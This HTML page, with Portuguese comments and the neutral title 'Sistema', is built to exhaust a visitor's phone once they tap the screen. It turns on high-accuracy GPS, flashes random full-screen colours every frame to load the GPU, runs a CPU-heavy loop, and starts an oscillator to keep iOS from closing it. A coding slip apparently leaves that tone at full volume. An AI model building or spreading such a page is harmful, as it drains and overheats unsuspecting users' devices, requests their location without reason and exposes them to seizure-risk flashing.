<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistema</title>
    <style>
        body { margin: 0; overflow: hidden; background: #000; }
        canvas { width: 100%; height: 100%; display: block; }
        #msg { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-family: sans-serif; text-align: center; pointer-events: none; }
    </style>
</head>
<body>
    <div id="msg">Tocando para iniciar...</div>
    <canvas id="c"></canvas>
    <script>
        // 1. Ativa GPS de alta precisão (consome muita bateria)
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(() => {}, () => {}, { enableHighAccuracy: true });
        }

        const canvas = document.getElementById('c');
        const ctx = canvas.getContext('2d', { alpha: false });

        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resize);
        resize();

        let running = false;

        function loop() {
            if (!running) return requestAnimationFrame(loop);

            // Desenha cores aleatórias na tela (força a GPU)
            ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            // Faz cálculos matemáticos rápidos (força o CPU)
            let x = 0;
            for(let i=0; i<100000; i++) x += Math.sin(i);

            requestAnimationFrame(loop);
        }

        // Inicia tudo ao tocar na tela
        document.body.addEventListener('click', () => {
            running = true;
            document.getElementById('msg').innerText = "";
            loop();

            // Toca um som invisível para o iOS não fechar o app
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                osc.type = 'sine';
                osc.frequency.setValueAtTime(1000, audioCtx.currentTime);
                osc.connect(audioCtx.destination);
                osc.start();
                osc.gain.value = 0.01; // Volume bem baixo
            } catch(e) {}
        });
    </script>
</body>
</html>
